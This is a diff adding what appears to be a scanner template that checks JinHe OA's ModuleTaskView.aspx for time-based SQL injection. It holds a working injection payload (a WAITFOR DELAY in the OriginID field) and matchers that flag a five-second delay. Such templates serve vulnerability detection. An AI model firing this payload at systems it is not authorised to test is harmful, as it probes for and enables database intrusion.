@@ -1,0 +1,27 @@
+id: JinHeOA-ModuleTaskView-sqlInjection
+
+info:
+  name: JinHeOA-ModuleTaskView-sqlInjection
+  author: iSee857
+  severity: high
+  description: JinHeOA-ModuleTaskView-sqlInjection
+
+requests:
+  - method: POST
+    raw:
+      - |
+        POST /c6/Jhsoft.Web.dailytaskmanage/ModuleTaskView.aspx/ HTTP/1.1
+        Host: {{Host}}
+        Content-type:application/x-www-form-urlencoded
+
+        OriginModule=crmexec&OriginID=1'WAITFOR+DELAY'0:0:5'--
+      
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
